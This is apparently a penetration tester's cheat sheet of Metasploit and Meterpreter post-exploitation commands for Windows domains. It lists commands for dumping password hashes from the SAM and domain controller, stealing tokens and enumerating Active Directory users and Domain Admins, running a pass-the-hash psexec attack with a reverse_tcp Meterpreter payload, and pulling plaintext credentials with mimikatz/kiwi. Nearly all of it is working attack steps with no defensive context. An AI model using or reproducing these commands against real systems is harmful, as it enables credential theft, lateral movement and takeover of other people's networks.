# hashdump

## Pull from Registry(SAM and Syskey)
- hashdump 
- run hashdump 
## Pull Disk both DC and SAM 
- run post/windows/gather/smart_hashdump
## Pull from Registry 
- run post/windows/gather/hashdump 

# extapi
- steal_token (to use domain creds)
- load extapi
- adsi_computer_enum <domain>
- adsi_user_enum <domain>
- adsi_nested_group_user_enum <domain> "CN=Domain Admins,CN=Users,DC=<domain>"
- resolve <host>
- nbtstat -A <hostip>




# pass-the-hash
- exploit/windows/smb/psexec
- set payload windows/meterpreter/reverse_tcp
- set smbuser <user>
- set smbpass <hash after group id but not last 3 colons>
- set smbdomain <domain>

# mimikatz/kiwi
- load kiwi
- creds_kerberos
- kiwi_cmd sekurlsa::logonpasswords
- creds_all 
